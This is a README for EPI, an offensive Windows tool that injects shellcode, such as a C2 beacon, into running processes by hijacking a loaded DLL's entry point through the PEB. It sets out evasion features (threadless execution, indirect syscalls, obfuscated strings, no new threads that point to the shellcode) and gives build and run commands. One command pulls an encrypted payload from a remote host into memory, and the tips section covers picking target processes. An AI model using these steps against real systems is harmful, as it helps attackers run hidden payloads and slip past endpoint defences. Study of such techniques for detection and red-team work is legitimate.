# EPI

EPI (Entry Point Injection) is a tool that leverages a new threadless process injection technique that relies on hijacking loaded dll's [entry points](https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain). To achieve this goal, EPI patches the target process' PEB such that one of the already loaded dll's entry point is redirected to a injected shellcode (which by default is the Loader previously converted to sRDI). Once a new thread is naturally spawned by the process or whenever a running thread exits, all loaded modules' entry points will be called which includes our injected shellcode. 

Since we want the target process to continue its execution smoothly, generally speaking it is a bad idea to run our payload directly on the thread that is calling the hijacked entry point. For example, the direct execution of a C2 becon would completely hijack the thread which would surely lead to the program crash in case that the application is expecting the thread to perform a certain task. To deal with this situation, EPI by default does not directly inject the desired payload but a custom Loader, which is a regular dll converted to [sRDI](https://github.com/monoxgas/sRDI). The Loader has embedded the encrypted final payload (for example, the previously commented C2 beacon), and its main task is to decrypt, allocate and run this payload in a stable way. To achieve the execution keeping the "threadless" nature of the technique, the Loader will use the process' thread pool to run the payload by calling [RtlQueueWorkItem](https://learn.microsoft.com/es-es/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-queueuserworkitem). The use of RtlQueueWorkItem ensures that, even in the case that a new thread is spawned (it depends on the thread pool availability), the start routine's address will never point to our payload avoiding that particular IOC.

Before exiting, the Loader restores the PEB and other modified structures to their previous state, preventing the multiple execution of our payload and allowing the process to continue its normal execution.

By default, this tool hijacks `kernelbase.dll` entry point. Feel free to target a different dll, but make sure that the dll is loaded in both processes involved in this activity.

The provided shellcode embedded in the Loader spawns a new `cmd.exe /k msg "hello from kudaes"` process.

The advantages of this technique are the following:
* Both threadless or threaded execution, at will.
* No hooking (i.e. no RX memory regions are patched with JMP or CALL instructions).
* No generation of private memory regions on well known dll's RX memory pages.
* No RWX memory permissions required.
* The targeted process can continue its regular execution.
* No new threads with a start address pointing to our shellcode.

# Compilation 

Since we are using [LITCRYPT](https://github.com/anvie/litcrypt.rs) plugin to obfuscate string literals, it is required to set up the environment variable LITCRYPT_ENCRYPT_KEY before compiling the code:

	C:\Users\User\Desktop\EPI> set LITCRYPT_ENCRYPT_KEY="setarandomkeyeachtime"

Then, depending on how you want to use the tool we have three different compilation processes.

## Use the tool as it is provided

In this case, you just need to compile the EPI project:
	
	C:\Users\User\Desktop\EPI\EPI> cargo build --release

After that, run the tool:
	
	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -h 

## No Loader - Custom payload

If you just want to directly execute your custom shellcode without using the Loader (which is **highly unrecommended**), just run `builder.py` with the flag `-p` indicating the full path of your payload file. Then, just run `epi.exe`:

	C:\Users\User\Desktop\EPI> python3 builder.py -p c:\path\to\payload.bin
	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -h 

Be aware that, depending on the behaviour of your shellcode, you might end up hijacking the thread and potentially causing a process crash. Also, take into account that no cleanup will be performed when injecting this way, leading to all kind of unexpected process behaviours.

## Loader & Custom payload

This is my recommended choice, since it allows you to fully customize the execution in the most reliable way. This is the right option if you want to run a different payload than the one provided and use the functionality of the Loader to avoid the crash of the target process. Also, the Loader is responsible for performing the cleanup and restoring the modified structures to their previous state.

To build the tool, run `builder.py` with the `-l` flag to indicate the use of the Loader. In case you want to enable the use of indirect syscalls in the Loader, you can do so by passing the `-i` flag.

	C:\Users\User\Desktop\EPI> python3 builder.py -l -p c:\path\to\payload.bin [-i]

This execution will embed your payload in the Loader, compile the Loader, convert it into sRDI and embed the final PIC code in the injector. Once the builder ends its execution, the injector is ready to be used:

	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> [flags]

If you don't want to embed the final PIC code in the resulting binary, you can encrypt it (simple xor encryption) passing the `-d` flag to the builder and then download it directly into the injector's process memory using HTTP:

	C:\Users\User\Desktop\EPI> python3 builder.py -l -p c:\path\to\payload.bin -d [-i]

The resulting encrypted payload will be written to the `payload` directory. The encryption key will be the same value used for the `LITCRYPT_ENCRYPT_KEY` environment variable. This value has to be passed to `epi.exe` to be able to decrypt the payload in runtime:

	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> -u http://remoteip/payload.bin -k setarandomkeyeachtime [flags]

# Usage 

The basic usage is by passing to the tool the PID of the target process and waiting for a thread to spawn/exit:

	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337

In case that you need to enable the `DEBUG` privilege to perform the injection, you can use the flag `-d`. Also, the use of indirect syscalls in the injector can be enabled using the `-i` flag.

	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337 -d -i 

If you do not want to wait until a new thread is naturally spawned, you can use the flag `-f` to spawn a new dummy thread. This dummy thread will run [ExitThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread) (i.e. it's a self destructing thread), but before that it will call every single loaded module's entry point, including our shellcode. The good part of this is that despite making the technique threaded, the new spawned thread's initial routine will point to ExitThread and not to our injected shellcode.

	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337 -f

Finally, you can also force the execution of the injected shellcode by sending a [WM_QUIT](https://learn.microsoft.com/en-us/windows/win32/winmsg/wm-quit) message to ALL threads of the target process. If there is any thread listening for this kind of messages it will exit itself by calling ExitThread, which internally calls every loaded module's entry point to allow them to uninitialize and free resources. In this scenario, our shellcode will be executed as well. **BE AWARE** that this most likely will "terminate" the process, meaning that the user won't be able to interact with it anymore although the shellcode execution will continue in the background. This method is not recommended to run any long-term payload. 

 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337 -s

In case that you built the payload so that it is downloaded directly into memory, the `-u` (remote HTTP site serving the payload) and `-k` (decryption key) flags must be passed to the injector.
	
	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> -u http://remoteip/payload.bin -k setarandomkeyeachtime [flags]

# Tips

 If you want to exploit the threadless nature of this technique, you need to chose wisely the target process. The best processes are those with user interaction, since they are constantly creating and destroying threads.

 To test EPI, I like to target my favourite text editor: Sublime Text. Besides the fact that I love it, it's also very simple to force it to spawn a new thread, allowing me to easily test EPI. If you want to do it as well, just follow these simple steps:

* Run Sublime Text.
* Inject on it using EPI's basic usage.
* Click on "File" -> "Open File". This will create a new thread and your shellcode will be executed.
* Keep using Sublime to verify that the process continues to run normally.

![Sublime Text injection.](/images/sublime1.png "Sublime Text injection.")

In case that you want to test the execution of the shellcode when a thread exits, you can do so as well with Sublime Text this way:

* Run Sublime Text.
* Click on "File" -> "Open File".
* Inject your shellcode using EPI's basic usage.
* Click on "Cancel" to exit the previously generated thread. Your shellcode will be executed by the terminating thread.
* Keep using Sublime to verify that the process continues to run normally.

Actually, you could also just wait for a minute or less since most of this kind of apps are constantly creating new threads in the background even without any user interaction.

# TODO

* Clean memory artifacts.
* Allow to target other dll than kernelbase.dll.

# Credits

* [monoxgas](https://github.com/monoxgas) for the astonishing [sRDI](https://github.com/monoxgas/sRDI) project that I have leveraged to convert the Loader dll into PIC.
* [memN0ps](https://twitter.com/memN0ps) for the hard work and all the effort shown in improving [srdi-rs](https://github.com/memN0ps/srdi-rs).
